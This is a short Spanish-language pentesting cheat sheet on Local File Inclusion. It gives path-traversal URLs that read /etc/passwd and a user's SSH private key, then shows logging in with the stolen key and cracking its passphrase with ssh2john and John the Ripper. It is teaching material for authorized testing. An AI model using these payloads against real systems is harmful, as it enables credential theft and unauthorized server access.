# Local File Inclusion (LFI)

LFI permite leer archivos locales del servidor web mediante la manipulacion de rutas en parametros de URL.

## Identificar LFI

Normalmente se encuentra en parametros como `page`, `file`, `doc`, `include`, etc.

```
http://example.com/index.php?page=home.php
```

## Path Traversal Basico

Navegacion hacia atras en el sistema de archivos para leer archivos sensibles:

```
http://example.com/index.php?page=../../../../etc/passwd
```

> La cantidad de `../` depende de la profundidad del directorio donde corre la aplicacion.

## Obtener Clave Privada SSH (id_rsa)

Si logramos leer la clave privada SSH, podemos conectarnos al servidor.

```
http://example.com/index.php?page=../../../../home/usuario/.ssh/id_rsa
```

### Usar la Clave id_rsa

```bash
chmod 600 id_rsa
ssh -i id_rsa usuario@IP_objetivo
```

### Si la Clave Tiene Contrasena

```bash
ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
